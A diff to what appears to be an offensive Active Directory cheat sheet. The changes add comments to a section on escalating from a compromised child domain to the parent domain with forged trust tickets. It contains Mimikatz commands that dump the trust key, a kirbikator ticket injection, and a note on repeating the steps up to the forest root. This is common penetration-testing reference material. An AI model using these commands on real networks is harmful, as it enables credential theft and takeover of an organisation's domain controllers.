@@ -1219,14 +1219,15 @@ sc \\targethosotname start dns
 ```
 
 
-
-
 ### Child to Parent using Trust Tickets
-
-**1. Look for [In] trust key from child to parent:**
 ```powershell
-# Look for [In] trust key from child to parent
+# In a trust  between child and parent, it's possible to move from domain admin in the child domain to Domain admin to parent.
+# The trust was initially done by exchanging a trust key between parent and child.
+
+# First step is to extract the trust key from the child (which is compromised)
 Invoke-Mimikatz -Command '"lsadump::trust /patch"'      
+# The key to be extracted
+
 ```
 **2. Create the inter-realm TGT:**
 ```powershell
@@ -1245,6 +1246,9 @@ forged trust ticket.:**
 .\kirbikator.exe lsa .\CIFS.mcorp-dc.corporate.local.kirbi
 # Check
 ls \\mcorp dc.corporate.local\c$
+
+# In a multilevel schema it's possible to do the previous steps multiple times to compromise one parent at a time until reaching the forest root
+
 ```
 
 ### Child to Parent using Krbtgt Hash
